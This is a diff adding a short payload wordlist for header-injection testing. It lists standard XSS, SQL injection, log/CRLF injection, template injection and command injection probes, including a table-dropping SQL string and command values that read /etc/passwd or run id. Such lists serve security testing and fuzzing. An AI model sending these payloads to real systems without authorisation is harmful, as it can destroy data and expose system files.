@@ -1,0 +1,36 @@
+# Header Injection Payloads
+# XSS payloads
+<script>alert("XSS")</script>
+"><script>alert(1)</script>
+'-alert(1)-'
+<img src=x onerror=alert(1)>
+{{7*7}}
+
+# SQLi payloads
+' OR '1'='1
+1' AND '1'='1
+'; DROP TABLE users--
+1; SELECT * FROM users--
+' UNION SELECT NULL--
+1' ORDER BY 1--
+
+# Log injection payloads
+INJECTED\r\nFake-Log-Entry: Hacked
+test\nINJECTED LOG LINE
+\r\n\r\n<html>injected</html>
+%0d%0aInjected-Header: value
+
+# SSTI payloads
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+@(7*7)
+
+# Command injection payloads
+; ls -la
+| cat /etc/passwd
+`id`
+$(id)
+; ping -c 1 127.0.0.1
